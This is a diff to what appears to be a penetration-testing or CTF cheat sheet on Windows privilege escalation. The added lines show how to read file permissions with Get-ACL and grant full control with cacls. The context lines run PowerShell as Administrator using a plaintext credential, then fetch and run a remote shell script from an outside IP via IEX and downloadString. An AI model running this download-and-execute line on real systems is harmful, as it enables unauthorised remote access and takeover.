@@ -20,6 +20,15 @@ $SecPass = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
 Start-Process -FilePath "powershell" -argumentList "IEX(New-Object Net.webClient).downloadString('http://10.10.14.30/Shellz4all.ps1')" -Credential $cred
 ```
+# Get File Permissions
+```
+Get-ACL <filename> | Fl *
+```
+# Change File Permissions (if you are the owner)
+```
+cacls <filename> /t /e /p <username>:F
+```
+- `F`: Full Permission
 
 
 ---
